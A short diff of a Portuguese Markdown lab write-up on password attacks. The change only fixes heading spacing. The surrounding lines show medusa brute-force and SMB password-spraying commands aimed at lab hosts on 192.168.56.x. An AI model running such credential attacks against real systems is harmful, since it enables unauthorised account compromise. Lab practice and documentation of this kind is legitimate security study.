@@ -75,11 +75,11 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -t 6
 ```
 
-#🗂️ Enumeração e Password Spraying em SMB
+# 🗂️ Enumeração e Password Spraying em SMB
 
 Também foram realizados testes contra serviços SMB utilizando password spraying, onde várias contas são testadas com poucas senhas.
 
-###Comando utilizado
+### Comando utilizado
 ```bash
 medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
 ```
